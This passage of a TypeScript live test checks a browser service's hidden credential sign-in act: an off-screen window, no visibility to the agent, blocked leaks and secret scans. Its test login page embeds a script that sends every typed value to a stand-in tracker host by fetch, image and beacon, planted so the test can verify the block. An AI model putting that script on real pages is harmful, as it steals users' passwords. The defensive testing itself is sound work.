// The live check of the sign-in act in the service's model (board ab-v16.97.4; contract C11, the sign-in act). It runs
// the real service (`agent-browser service --test`, with its pinned agent package: the receiver 0.3.9 of chrome-extension
// 443f968, board ab-v16.97.10) in temp folders only, on one free display, under the harness guard, and it is the
// service's "daemon" on the control door. With `--chrome-extension <checkout>` it also checks that the pinned commit's
// release/agent.crx (`git show`, read only, never packed) is the same bytes as the service's copy. Test values only: a made-up username,
// password and passphrase, named so; the local pages are on *.localhost hosts of a server of this process.
//
//   1. the store: the snapshot, the set-up with a pane's seal, the seal of one credential, the snapshot with it;
//   2. Chrome with the pinned receiver 0.3.9 (its hello has the feature act), the lists, a CDP client of the session's
//      scope;
//   3. the client's own tab of the site shows "not signed in";
//   4. AgentBrowser.signIn on the client's root session: the act window off the screen (its X window to the right of the
//      screen's area while the act runs) and hidden from the client (no target, no event of it), the page's script
//      that sends each typed value to a host outside send_to (a fetch POST, an image, a beacon) blocked, signed in;
//   5. the outcome and the clean end: the sign_in start and end events (signed_in, the block's count), the act window
//      gone, the tracker host got no request of the act tab;
//   6. the move: the client's new tab of the site loads signed in (the cookie and the localStorage token moved);
//   7. the CLI: sign-ins lists the credential, sign-in signs in again, sign-in of another name gets C11's text, exit 1;
//   7b. the MCP (board ab-v16.97.5), with a real MCP client (the MCP SDK's own, mcp-client.ts) over the MCP path
//      (--test-mcp-port 0): for the local scope live-1, tools/list holds browser_sign_in and browser_sign_ins,
//      browser_sign_ins lists the name and the origin only, browser_sign_in signs in (a new session of the site, moved
//      to the client's tabs), another name gets C11's text as the tool's error; for live-2, which
//      --test-mcp-remote-scope gives the remote admission (stage 5's stand-in), tools/list holds neither, each call gets
//      check 1's text from the act's own check 1: browser_sign_in sends its one refusal end (result remote, no start, no
//      credential), browser_sign_ins none, and no call signs in at the site;
//   8. the secret scan: no answer, event, control line, client message, CLI output, MCP result, log line or profile file holds a
//      test value in any of its five forms; its twin finds a planted one;
//   9. stop: Chrome, Xvfb and the shim end; the temp folders go.
//
// The design's live steps 2, 3, 5 and 7 (board ab-v16.97.6; the design's section 11, "The live check plan"; the pages
// and helpers are in cases.ts). Each runs as a step of its own: a failed check stops that step only, the run goes on,
// and it exits 1.
//   D5 (in step 4): the framebuffer during the act holds no pixel of the act window: frames of the display's root window
//      (ffmpeg's x11grab) hold no pixel of the sign-in page's colour, which its twin (an agent tab of that colour on the
//      screen) finds; the live view's part (no frame to a viewer during the act) is agentwatch's;
//   D2: the client (the agent) tries each read of the design's section 4.2 on its own tabs during and after an act, and
//      the same-origin channels of round 1's case K1 (its cache-first service worker at the sign-in path, BroadcastChannel,
//      the storage event, which its contrast shows live in the default context): none gets a test value, and it sees no
//      target and no window of the act;
//   D3: each refusal of section 7.9 that the local site can make, with C11's exact text and result;
//   D7: a restart of the service: the store is locked (and an act gets C11's text); a wrong passphrase does not open it;
//      the test unlock (the pane's seal of the test passphrase) opens it, and an act signs in again.
//
// It never touches another Chrome, Xvfb, profile or folder: it signals only the pids that its run started.
//   flock <heavy.lock> timeout 1800 node test/live/sign-in-act/check.ts --display 171 [--chrome-extension <checkout>]

import { execFile, execFileSync, spawn, spawnSync, type ChildProcess } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { connect, type Socket } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { CDPConnection, type CDPError } from "../../../src/cdp.ts";
import { AGENT_CRX, AGENT_CRX_SHA256, AGENT_VERSION, CHROME_EXTENSION_COMMIT, RECEIVER_ID } from "../../../src/service/package/pins.ts";
import { passwordForms } from "../../../src/service/signins/act-rules.ts";
import { GOOGLE_SOURCE, GoogleChromeTools } from "../../../src/service/unit/google-chrome.ts";
import { makeChromeRepo } from "../../chrome-fixture.ts";
import { paneSeal } from "../../sign-in-seal.ts";
import { harnessGuard, reservedDisplay } from "../guard.ts";
import { ACT_COLOR, COLOR_CSS, R_LONG_PASS, R_LONG_USER, R_PASS, R_USER, REFUSALS, TEXT, captureRoot, caseRoute, colorPixels, held, sockets, stats, upgrade, type Case } from "./cases.ts";

const ROOT = fileURLToPath(new URL("../../../", import.meta.url));
const BIN = join(ROOT, "bin", "agent-browser.js");
const arg = (k: string) => { const i = process.argv.indexOf(k); return i > 0 ? process.argv[i + 1] : undefined; };
const display = Number(arg("--display") ?? "171");
// This check runs on :171 or :172 only (review-124 N11); the guard's reserved list holds too.
const refused = reservedDisplay(display, "--display") ?? (![171, 172].includes(display) ? `--display names :${display}: this check runs on :171 or :172 only` : null);
if (!Number.isSafeInteger(display) || refused) { process.stderr.write(`sign-in-act: ${refused ?? "--display must be a number"}\n`); process.exit(2); }
if (existsSync(`/tmp/.X11-unix/X${display}`) || existsSync(`/tmp/.X${display}-lock`)) { process.stderr.write(`sign-in-act: :${display} is in use; this check runs on a free display only\n`); process.exit(2); }
const CE = arg("--chrome-extension");
const CHROMIUM_TREE = "/usr/lib/chromium";

// The test values: made up, named as test values; the canaries of the scan.
const USER = "test-user.live.at.login.localhost";
const PASS = "Test-Live-Pass-4Kq2-not-a-secret";
const PASSPHRASE = "test passphrase of the live check 2026";
const CANARIES = [USER, PASS, PASSPHRASE, R_USER, R_PASS, R_LONG_USER, R_LONG_PASS];
// Made-up connection tokens of this run for the MCP path (C12: set_sessions carries only their fingerprints).
const TOKEN_L = `abt1_${randomBytes(32).toString("base64url")}`, TOKEN_R = `abt1_${randomBytes(32).toString("base64url")}`;
const fp = (t: string) => createHash("sha256").update(t, "ascii").digest("hex");
const MCP_CLIENT = fileURLToPath(new URL("./mcp-client.ts", import.meta.url));

const t0 = Date.now();
const log = (s: string) => process.stdout.write(`[${((Date.now() - t0) / 1000).toFixed(1)} s] ${s}\n`);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const results: { step: string; ok: boolean; note: string }[] = [];
const check = (step: string, ok: boolean, note = "") => { results.push({ step, ok, note }); log(`${ok ? "PASS" : "FAIL"} ${step}${note ? `: ${note}` : ""}`); if (!ok) throw new Error(`${step} failed${note ? `: ${note}` : ""}`); };
/** A check that records its result and goes on (the design steps' checks after their reads; `check` stops the step). */
const verify = (step: string, ok: boolean, note = "") => { results.push({ step, ok, note }); log(`${ok ? "PASS" : "FAIL"} ${step}${note ? `: ${note}` : ""}`); };
/** A design step of section 11 (D2, D3, D5, D7): a failed check stops this step only; the run goes on, and it exits 1. */
const designSteps: { name: string; ok: boolean; note: string }[] = [];
const designStep = async (name: string, f: () => Promise<void>) => {
  const n0 = results.length;
  let stop = "";
  try { await f(); } catch (e) { stop = (e as Error).message.split("\n")[0].slice(0, 300); }
  const mine = results.slice(n0), bad = mine.filter((r) => !r.ok).length;
  const ok = !stop && bad === 0;
  const note = `${mine.length - bad} of ${mine.length} checks pass${stop ? `; stopped: ${stop}` : ""}`;
  designSteps.push({ name, ok, note });
  log(`STEP ${name}: ${ok ? "PASS" : "FAIL"} (${note})`);
};
/** The scan's forms: each test value in each of its five forms (the act's own passwordForms). */
const forms = CANARIES.flatMap((v) => passwordForms(v));
const holds = (t: string) => forms.some((f) => t.includes(f));
const until = async (what: string, f: () => boolean, ms: number) => { const end = Date.now() + ms; while (!f()) { if (Date.now() > end) throw new Error(`${what}: not in ${ms / 1000} s`); await sleep(100); } };
function proc(pid: number): { start: number; ppid: number; argv: string[] } | null {
  try {
    const st = readFileSync(`/proc/${pid}/stat`, "latin1");
    const f = st.slice(st.lastIndexOf(")") + 2).split(" ");
    if (["Z", "X"].includes(f[0])) return null;
    return { start: Number(f[19]), ppid: Number(f[1]), argv: readFileSync(`/proc/${pid}/cmdline`, "utf8").split("\0").filter(Boolean) };
  } catch { return null; }
}

const guard = await harnessGuard("sign-in-act");
const dir = mkdtempSync(join(tmpdir(), "ab-act-live-"));
const run = join(dir, "run"), state = join(dir, "state"), tools = join(dir, "tools"), lists = join(dir, "lists"), cliState = join(dir, "cli");
for (const d of [run, lists, cliState]) mkdirSync(d, { mode: 0o700 });
const started = new Map<number, number>();
let service: ChildProcess | null = null;
let serviceErr = "";
let repo: ReturnType<typeof makeChromeRepo> | null = null;
/** Every text that the scan reads: control lines, answers, client messages, CLI outputs, the agent's reads (D2). */
const seen: string[] = [];

// ---- the local site: login.localhost (the sign-in page, its POST, the signed-in page) and tracker.localhost (it records)
const sessions = new Set<string>();
/** The site's sessions in the order of their sign-ins, and the session of each request of /home (the move's proof). */
const signIns: string[] = [];
const homes: (string | null)[] = [];
const tracker: { path: string; body: string; at: number }[] = [];
let actWindow: { from: number; to: number } | null = null;
let port = 0;
const loginPage = (error = "") => `<!doctype html><title>aw-live-sign-in-page</title>${COLOR_CSS}
<form method="post" action="/login"><p>${error}</p><input type="email" name="u" autocomplete="username"><input type="password" name="p"><button type="submit">Sign in</button></form>
<script>
for (const el of document.querySelectorAll("input")) el.addEventListener("input", () => {
  const t = "http://tracker.localhost:${0}/";
  try { fetch(t.replace(":0/", ":" + location.port + "/") + "post", { method: "POST", body: el.value, mode: "no-cors" }).catch(() => {}); } catch (e) {}
  try { new Image().src = t.replace(":0/", ":" + location.port + "/") + "img?v=" + btoa(unescape(encodeURIComponent(el.value))); } catch (e) {}
  try { navigator.sendBeacon(t.replace(":0/", ":" + location.port + "/") + "beacon", el.value); } catch (e) {}
});
</script>`;
const http = createServer((req, res) => {
  const host = String(req.headers.host ?? "").split(":")[0];
  let body = "";
  req.on("data", (d) => { body += d; });
  req.on("end", () => {
    if (caseRoute(host, req, res, body, port)) return;
    if (host === "tracker.localhost") { tracker.push({ path: req.url ?? "", body, at: Date.now() }); res.writeHead(204, { "Access-Control-Allow-Origin": "*" }).end(); return; }
    if (host !== "login.localhost") { res.writeHead(404).end(); return; }
    const cookie = /(?:^|;\s*)test_session=([0-9a-f]+)/.exec(String(req.headers.cookie ?? ""))?.[1];
    if (req.method === "POST" && req.url === "/login") {
      const f = new URLSearchParams(body);
      if (f.get("u") === USER && f.get("p") === PASS) {
        const sid = randomBytes(16).toString("hex");
        sessions.add(sid);
        signIns.push(sid);
        res.writeHead(303, { "Set-Cookie": `test_session=${sid}; Path=/; HttpOnly; SameSite=Lax`, Location: "/home" }).end();
      } else res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(loginPage("not accepted"));
      return;
    }
    if (req.url === "/login") { res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(loginPage()); return; }
    const signedIn = cookie !== undefined && sessions.has(cookie);
    if (req.url === "/home") homes.push(cookie ?? null);
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" }).end(`<!doctype html><title>home</title><p id="state">${signedIn ? "signed in" : "not signed in"}</p>${signedIn ? `<script>localStorage.setItem("test_token", "test-token-1")</script>` : ""}`);
  });
});

http.on("upgrade", (req, socket) => { if (String(req.headers.host ?? "").split(":")[0] === "tracker.localhost" && req.url === "/ws") upgrade(req, socket); else socket.destroy(); });

type Door = { s: Socket; lines: any[]; next: (want: (l: any) => boolean, ms?: number) => Promise<any>; send: (o: object) => void };
function door(): Promise<Door> {
  return new Promise((resolve, reject) => {
    const s = connect(join(run, "control.sock"));
    const lines: any[] = [];
    let buf = "";
    const waiters: { want: (l: any) => boolean; done: (l: any) => void }[] = [];
    s.on("data", (d) => { buf += d; let i; while ((i = buf.indexOf("\n")) >= 0) { const raw = buf.slice(0, i); seen.push(raw); const l = JSON.parse(raw); buf = buf.slice(i + 1); lines.push(l); for (const w of [...waiters]) if (w.want(l)) { waiters.splice(waiters.indexOf(w), 1); w.done(l); } } });
    s.on("error", reject);
    s.once("connect", () => resolve({
      s, lines, send: (o) => s.write(JSON.stringify(o) + "\n"),
      next: (want, ms = 30_000) => { const hit = lines.find(want); if (hit) return Promise.resolve(hit); return new Promise((done, fail) => { const w = { want, done: (l: any) => { clearTimeout(t); done(l); } }; waiters.push(w); const t = setTimeout(() => { waiters.splice(waiters.indexOf(w), 1); fail(new Error(`no such line in ${ms} ms`)); }, ms); }); },
    }));
  });
}
let n = 0;
const req = async (d: Door, op: string, by: object, fields: object = {}, ms = 30_000) => { const id = `q${++n}`; d.send({ t: "req", id, op, by, ...fields }); return d.next((l) => l.t === "res" && l.id === id, ms); };
const TOKEN = { kind: "token", user: "live", via: "cli" }, DAEMON = { kind: "daemon", user: "live", via: "daemon" }, OPERATOR = { kind: "operator", user: "live", via: "web" };
const me = proc(process.pid)!;
const LIVE_1 = { scope: "live-1", repo: "local/test", roots: [{ pid: process.pid, start: me.start }], cgroup: null, lifetime_id: "lt-live", mcp_token: fp(TOKEN_L) };
const BOX = { hosts: ["box.localhost"], cookie_names: [] };

/** X windows of the run's own display (its Xvfb, its X authority): their name and place. */
function xWindows(): { id: string; name: string; x: number; y: number; w: number; h: number }[] {
  const env = { DISPLAY: `:${display}`, XAUTHORITY: join(state, "xauth") };
  const ids = spawnSync("xdotool", ["search", "--onlyvisible", "--name", ".*"], { env, encoding: "utf8", timeout: 3000 }).stdout.split("\n").filter((l) => /^\d+$/.test(l));
  return ids.map((id) => {
    const name = spawnSync("xdotool", ["getwindowname", id], { env, encoding: "utf8", timeout: 3000 }).stdout.trim();
    const g = spawnSync("xdotool", ["getwindowgeometry", id], { env, encoding: "utf8", timeout: 3000 }).stdout;
    const p = /Position:\s*(-?\d+),(-?\d+)/.exec(g), s = /Geometry:\s*(\d+)x(\d+)/.exec(g);
    return { id, name, x: Number(p?.[1] ?? NaN), y: Number(p?.[2] ?? NaN), w: Number(s?.[1] ?? NaN), h: Number(s?.[2] ?? NaN) };
  });
}

async function startService(): Promise<Door> {
  // A restart (D7) reads only its own run's part of the log.
  const from = serviceErr.length;
  service = spawn(process.execPath, ["--disable-sigusr1", BIN, "service", "--test", "--test-display", String(display), "--agent-door", join(run, "cdp.sock"), "--control-door", join(run, "control.sock"),
    "--daemon-command", join(dir, "daemon-command.json"), "--lists-folder", lists, "--state-folder", state, "--tools-dir", tools, "--test-chrome-source", join(dir, "source.json"),
    "--test-mcp-port", "0", "--test-mcp-remote-scope", "live-2"], { stdio: ["ignore", "ignore", "pipe"] });
  guard.track(service.pid, "service");
  started.set(service.pid!, proc(service.pid!)?.start ?? -1);
  service.stderr!.on("data", (d) => { serviceErr += d; });
  for (let i = 0; i < 300 && !serviceErr.slice(from).includes("service: ready"); i++) { if (service.exitCode !== null) break; await sleep(50); }
  if (!serviceErr.slice(from).includes("service: ready")) throw new Error(`the service did not start: ${serviceErr.slice(-800)}`);
  const d = await door();
  const hello = await d.next((l) => l.t === "hello");
  check("the service's hello lists the stored sign-ins (sign_ins)", hello.side === "service" && hello.features.includes("sign_ins"), JSON.stringify(hello.features));
  d.send({ t: "hello", v: 1, side: "daemon", version: "live", features: [] });
  const cfg = await req(d, "config", { kind: "daemon", user: "live", via: "config" }, { enabled: true, control: true, chrome_bin: null, chrome_args: [], display_size: "1280x900" });
  if (!cfg.ok) throw new Error(`config: ${JSON.stringify(cfg)}`);
  const ss = await req(d, "set_sessions", DAEMON, { sessions: [LIVE_1], remote: [], box: BOX });
  if (!ss.ok) throw new Error(`set_sessions: ${JSON.stringify(ss)}`);
  return d;
}
async function stopService(): Promise<void> {
  const s = service;
  if (!s || s.exitCode !== null) return;
  const exited = new Promise<void>((r) => s.once("exit", () => r()));
  s.kill("SIGTERM");
  await Promise.race([exited, sleep(15_000).then(() => { s.kill("SIGKILL"); })]);
}
const track = (pid: number | null | undefined, name: string) => { if (!pid) return; const p = proc(pid); if (p) { started.set(pid, p.start); guard.track(pid, name); } };
/** The CLI as a child, with no block of this process's event loop: the local site of this process must keep answering. */
const cli = (args: string[], url: string) => new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve) => {
  execFile(process.execPath, [BIN, ...args, "--state-dir", cliState, "--cdp-url", url], { encoding: "utf8", timeout: 240_000 }, (e, stdout, stderr) => {
    seen.push(stdout, stderr);
    resolve({ status: e ? (typeof (e as any).code === "number" ? (e as any).code : null) : 0, stdout, stderr });
  });
});

let code = 0;
try {
  // The service's pinned agent package (the receiver 0.3.9); with a checkout, the same bytes as the pinned commit's file.
  const crx = readFileSync(AGENT_CRX);
  check(`the service's agent package is the pinned CRX of receiver ${AGENT_VERSION} (SHA-256 ${AGENT_CRX_SHA256.slice(0, 8)}...)`, createHash("sha256").update(crx).digest("hex") === AGENT_CRX_SHA256 && AGENT_VERSION === "0.3.9", `${crx.length} bytes`);
  if (CE) {
    const fromGit = execFileSync("git", ["-C", CE, "show", `${CHROME_EXTENSION_COMMIT.slice(0, 7)}:release/agent.crx`], { maxBuffer: 1 << 24 });
    check(`git show ${CHROME_EXTENSION_COMMIT.slice(0, 7)}:release/agent.crx gives the same bytes as the service's copy`, fromGit.equals(crx));
  }
  const argv = readFileSync("/proc/self/cmdline", "utf8").split("\0").filter((x, i, a) => i < a.length - 1 || x !== "");
  writeFileSync(join(dir, "daemon-command.json"), JSON.stringify({ v: 1, interpreter: realpathSync(process.execPath), args: argv.slice(1) }), { mode: 0o600 });
  repo = makeChromeRepo({ version: "158.0.7100.1-1", chrome: `#!/bin/sh\nif [ "$1" = "--version" ]; then echo "Google Chrome 158.0.7100.1 "; exit 0; fi\nexec "$(dirname "$0")/chromium" "$@"\n` });
  writeFileSync(join(dir, "source.json"), JSON.stringify({ repo: repo.repo, key: repo.keyFile, fingerprints: [repo.fingerprint] }));
  chmodSync(dir, 0o700);
  const installer = new GoogleChromeTools({ tools, source: { ...GOOGLE_SOURCE, repo: repo.repo, keyFile: repo.keyFile, fingerprints: [repo.fingerprint] }, log: (l) => log(`installer: ${l}`) });
  const copy = await installer.ensure();
  for (const e of readdirSync(CHROMIUM_TREE)) cpSync(join(CHROMIUM_TREE, e), join(copy.binary, "..", e), { recursive: true, force: true });
  await new Promise<void>((r) => http.listen(0, "127.0.0.1", () => r()));
  port = (http.address() as { port: number }).port;
  const ORIGIN = `http://login.localhost:${port}`;
  writeFileSync(join(lists, "local.test.json"), JSON.stringify({ allow: ["login.localhost", "tracker.localhost", "other.localhost"], repo: "local/test" }), { mode: 0o600 });

  // 1. The store: the snapshot, the set-up, the seal of one credential, the snapshot with it.
  let d = await startService();
  check("the snapshot of an empty store", (await req(d, "sign_ins", DAEMON, { key: null, records: [] })).ok === true);
  const paneKey = (await req(d, "status", DAEMON)).data.sign_ins.pane_key as string;
  const at = () => new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
  const setup = await req(d, "sign_ins_setup", OPERATOR, { sealed: paneSeal(paneKey, { passphrase: PASSPHRASE }, { op: "sign_ins_setup" }, { at: at() }) }, 60_000);
  check("sign_ins_setup with the pane's seal of a test passphrase opens the store", setup.ok === true && !!setup.data.key, JSON.stringify(setup).slice(0, 200));
  check("the snapshot with the key", (await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: [] })).ok === true);
  const record = { id: "c-0000a11e", name: "staging", origin: ORIGIN, path: "/login", send_to: [ORIGIN] };
  const sealed = await req(d, "sign_in_seal", OPERATOR, { record, offer: false, sealed: paneSeal(paneKey, { username: USER, password: PASS }, { op: "sign_in_seal", record, offer: false }, { at: at() }) });
  check("sign_in_seal seals the test credential (its id in the seal's binding)", sealed.ok === true && sealed.data.record.approved === true, JSON.stringify(sealed).slice(0, 160));
  const file = { ...sealed.data.record, state: "usable", added: null, changed: null, sealed: sealed.data.sealed };
  /** The daemon's records (the snapshot's): D3 adds the refusals' records, and D7's snapshot after the restart sends them all. */
  let allFiles: Record<string, unknown>[] = [file];
  check("the snapshot with the record", (await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: [file] })).ok === true);
  check("status: the store is open with one record", (await req(d, "status", DAEMON)).data.sign_ins.state === "open");

  // 2. Chrome with the pinned receiver 0.3.9, its hello with the feature act; the lists; a client of the scope.
  const a1 = await req(d, "start", TOKEN, {}, 120_000);
  check("start answers ok", a1.ok === true, JSON.stringify(a1));
  const ready = await d.next((l) => l.t === "ev" && l.ev === "ready");
  track(ready.chrome_pid, "chrome");
  track(JSON.parse(readFileSync(join(state, "unit.json"), "utf8")).xvfb_pid, "xvfb");
  check(`the ready event carries the pinned receiver ${AGENT_VERSION}`, ready.extension_version === AGENT_VERSION, JSON.stringify(ready));
  const prefs = JSON.parse(readFileSync(join(state, "profile", "Default", "Preferences"), "utf8"));
  check("Chrome's preferences: the receiver allowed in incognito, no password saving, no leak check", prefs.extensions?.settings?.[RECEIVER_ID]?.incognito === true && prefs.credentials_enable_service === false && prefs.profile?.password_manager_leak_detection === false);
  await until("the receiver confirms the lists", () => /lists: the receiver took the lists of 1 scopes/.test(serviceErr), 60_000);
  check(`the receiver ${AGENT_VERSION} said hello on the link`, serviceErr.includes(`link: the receiver ${AGENT_VERSION} said hello (bridge, scopes)`), serviceErr.match(/link: the receiver.*/)?.[0] ?? "");
  const url = (await req(d, "endpoint", DAEMON, { scope: "live-1" })).data.url as string;
  let cdp: CDPConnection | null = null;
  for (let i = 0; i < 50 && !cdp; i++) { try { cdp = await CDPConnection.connect(url, 5000); } catch (e) { if (i === 49) throw e; await sleep(200); } }
  let c = cdp!;
  const events: string[] = [];
  for (const m of ["Target.targetCreated", "Target.targetInfoChanged", "Target.attachedToTarget", "Target.targetDestroyed", "Target.detachedFromTarget"]) c.on(m, (p) => { events.push(JSON.stringify({ m, p })); seen.push(JSON.stringify(p)); });
  await c.send("Target.setDiscoverTargets", { discover: true });
  const text = async (sid: string) => { for (let i = 0; i < 50; i++) { const v = (await c.send("Runtime.evaluate", { expression: "document.getElementById('state') ? document.getElementById('state').textContent : ''", returnByValue: true }, sid)).result.value; if (v) return v; await sleep(200); } return ""; };
  const open = async (u: string) => { const { targetId } = await c.send("Target.createTarget", { url: u }); const { sessionId } = await c.send("Target.attachToTarget", { targetId, flatten: true }); return { targetId, sessionId }; };

  // 3. Before the act: not signed in.
  const t1 = await open(`${ORIGIN}/home`);
  check("before the act the client's own tab of the site is not signed in", (await text(t1.sessionId)) === "not signed in");

  // D5's twin (board ab-v16.97.6): an agent tab of the sign-in page's colour on the screen; the frames find the colour,
  // and none after the tab's close (the screen before the act).
  const xauth = join(state, "xauth"), SCREEN = [1280, 900] as const;
  const pixels = async () => { const f = await captureRoot(display, xauth, SCREEN); return f ? colorPixels(f) : -1; };
  await designStep("D5a the framebuffer's twin", async () => {
    const tw = await open(`${ORIGIN}/twin`);
    await c.send("Page.bringToFront", {}, tw.sessionId).catch(() => {});
    let found = -1;
    for (let i = 0; i < 20 && found < 10_000; i++) { await sleep(250); found = await pixels(); }
    check(`D5 twin: a frame of the root window (ffmpeg x11grab of :${display}) shows the sign-in page's colour rgb(${ACT_COLOR.join(",")}) while an agent tab of that colour is on the screen`, found >= 10_000, `${found} pixels`);
    await c.send("Target.closeTarget", { targetId: tw.targetId });
    let left = -1;
    for (let i = 0; i < 20 && left !== 0; i++) { await sleep(250); left = await pixels(); }
    check("D5 twin: after the twin tab's close, a frame holds no pixel of the colour (the screen before the act)", left === 0, `${left} pixels`);
  });

  // 4. The act: watch the X windows and the client's targets while it runs.
  const before = new Set(((await c.send("Target.getTargets")).targetInfos as any[]).map((t) => t.targetId));
  const xSeen: { name: string; x: number; y: number; w: number; h: number }[] = [];
  const targetsSeen = new Set<string>();
  /** D5: the frames of the root window during the act; `page`: the looks before and after the frame saw the act page's window. */
  const frames: { px: number; page: boolean }[] = [];
  let watching = true;
  const watch = (async () => {
    while (watching) {
      const look = xWindows();
      for (const w of look) if (/aw-live-sign-in-page|aw-act-/.test(w.name)) xSeen.push(w);
      const px = await pixels(), look2 = xWindows();
      for (const w of look2) if (/aw-live-sign-in-page|aw-act-/.test(w.name)) xSeen.push(w);
      frames.push({ px, page: [look, look2].every((l) => l.some((w) => /aw-live-sign-in-page/.test(w.name))) });
      for (const t of (await c.send("Target.getTargets")).targetInfos as any[]) targetsSeen.add(`${t.targetId} ${t.url}`);
      await sleep(150);
    }
  })();
  const actFrom = Date.now();
  const answer = await c.send("AgentBrowser.signIn", { name: "staging" }, undefined, 240_000);
  actWindow = { from: actFrom, to: Date.now() };
  watching = false;
  await watch;
  seen.push(JSON.stringify(answer));
  check("AgentBrowser.signIn answers signed in", answer.signedIn === true && answer.name === "staging" && answer.origin === ORIGIN, JSON.stringify(answer));
  const page = xSeen.filter((w) => /aw-live-sign-in-page/.test(w.name));
  check("the sign-in page's X window was outside the screen each time that the watch saw it (to the right of the 1280 px screen)", page.length > 0 && page.every((w) => w.x >= 1280), `${page.length} looks: ${JSON.stringify(page.slice(0, 3))}`);
  check("the act window's title marker was outside the screen once the page loaded (the move before the page)", xSeen.every((w) => !/aw-live-sign-in-page/.test(w.name) || w.x >= 1280));
  // The act's page is the path /login (the host login.localhost is in every URL of the site, the client's own tabs too).
  const actPage = (u: string) => { try { return new URL(u).pathname === "/login" || u.startsWith("about:blank"); } catch { return false; } };
  check("the client saw no target of the act: Target.getTargets during the act held only its own tabs", ![...targetsSeen].some((t) => actPage(t.split(" ")[1] ?? "")) && [...targetsSeen].every((t) => before.has(t.split(" ")[0])), [...targetsSeen].join(", "));
  check("no Target event of the client named the act tab or its page", !events.some((e) => /localhost:\d+\/login\b|aw-act-|aw-live-sign-in-page/.test(e)), `${events.length} events`);
  await designStep("D5b the framebuffer during the act", async () => {
    const taken = frames.filter((f) => f.px >= 0), during = taken.filter((f) => f.page);
    check("D5: frames of the display's root window were taken while the act page's window was open (a look of its X window before and after each)", during.length > 0, `${frames.length} frames, ${taken.length} read, ${during.length} with the act page's window open`);
    check("D5: no frame during the act holds a pixel of the sign-in page's colour (the act window is outside the screen's area)", taken.every((f) => f.px === 0), `${taken.filter((f) => f.px > 0).length} frames with the colour`);
    log("D5 NOTE: the live view's part of the design's step 5 (no frame to a viewer during an act) is agentwatch's; this check reads the display's framebuffer only");
  });

  // 5. The outcome and the clean end.
  const start = d.lines.find((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "start");
  const end = await d.next((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "end");
  check("the sign_in events: a start and an end with the act id, signed_in, the credential, no host", !!start && start.act === end.act && end.result === "signed_in" && end.id === "c-0000a11e" && end.scope === "live-1", JSON.stringify(end));
  check("the end counts the requests that the block stopped (the page's sends to the tracker host)", end.blocked > 0, `blocked ${end.blocked}, guarded ${end.guarded}`);
  const actHits = tracker.filter((r) => r.at >= actWindow!.from && r.at <= actWindow!.to);
  check("the tracker host outside send_to got no request during the act (the fetch POST, the image, the beacon of each typed value)", actHits.length === 0, `${actHits.length} requests`);
  check("no request of the tracker host holds a test value", !tracker.some((r) => CANARIES.some((v) => passwordForms(v).some((f) => r.path.includes(f) || r.body.includes(f)))));
  await sleep(500);
  check("the clean end: no X window of the act is left (act_end closed it)", !xWindows().some((w) => /aw-live-sign-in-page|aw-act-/.test(w.name)));
  check("the clean end: no act_end failed", !/act_end failed/.test(serviceErr));

  // 6. The move: a new tab of the client loads signed in.
  const t2 = await open(`${ORIGIN}/home`);
  check("after the move the client's new tab of the site is signed in (the cookie moved)", (await text(t2.sessionId)) === "signed in");
  await c.send("Runtime.evaluate", { expression: `fetch("http://tracker.localhost:${port}/control").then(() => 1, () => 0)`, awaitPromise: true }, t2.sessionId);
  await sleep(300);
  check("after the act the tracker host is reachable again from the agent's own tab (the act's rules are gone)", tracker.some((r) => r.path === "/control"));

  // 7. The CLI: sign-ins, sign-in again, sign-in of another name.
  const list = await cli(["sign-ins", "--json"], url);
  check("agent-browser sign-ins lists the credential", list.status === 0 && JSON.parse(list.stdout).signIns.some((x: any) => x.name === "staging" && x.origin === ORIGIN), list.stdout + list.stderr);
  const again = await cli(["sign-in", "staging"], url);
  check("agent-browser sign-in staging signs in again", again.status === 0 && again.stdout === `Signed in to ${ORIGIN}. Your tabs of this site were closed for the sign-in; open the site again: it loads signed in.\n`, again.stdout + again.stderr.slice(-300));
  const other = await cli(["sign-in", "missing"], url);
  check("agent-browser sign-in of another name gets C11's text and exits 1", other.status === 1 && other.stderr === "agent-browser: Not signed in: There is no stored sign-in named missing for this repo.\n", other.stderr);

  // 7b. The MCP: a real MCP client over the MCP path, for the local scope live-1 and the remote stand-in live-2.
  const mcpAddress = (await req(d, "status", DAEMON)).data.mcp.address as string;
  check("status: the MCP path is ready on 127.0.0.1", typeof mcpAddress === "string" && mcpAddress.startsWith("127.0.0.1:"), String(mcpAddress));
  /** The MCP client as a child (so the port's walk reads it), with its job on its standard input once `before` is done. */
  const mcpClient = (scope: string, token: string, calls: { name: string; arguments: Record<string, unknown> }[], before?: (pid: number) => Promise<void>) => new Promise<any>((resolve, reject) => {
    const child = spawn(process.execPath, ["--disable-sigusr1", "--no-warnings", MCP_CLIENT], { stdio: ["pipe", "pipe", "pipe"] });
    track(child.pid, `the MCP client of ${scope}`);
    let out = "", err = "";
    child.stdout!.on("data", (x) => { out += x; });
    child.stderr!.on("data", (x) => { err += x; });
    const timer = setTimeout(() => child.kill("SIGKILL"), 300_000);
    child.once("close", () => { clearTimeout(timer); seen.push(out, err); try { resolve(JSON.parse(out.split("\n")[0])); } catch { resolve({ error: `no answer: ${err.slice(-300)}` }); } });
    void (before ? before(child.pid!) : Promise.resolve()).then(() => { child.stdin!.end(JSON.stringify({ url: `http://${mcpAddress}/mcp/${scope}`, token, calls }) + "\n"); }, (e) => { child.kill("SIGKILL"); reject(e); });
  });
  const signInEvents = () => d.lines.filter((l) => l.t === "ev" && l.ev === "sign_in");
  const ev0 = signInEvents().length, sid0 = signIns.length;
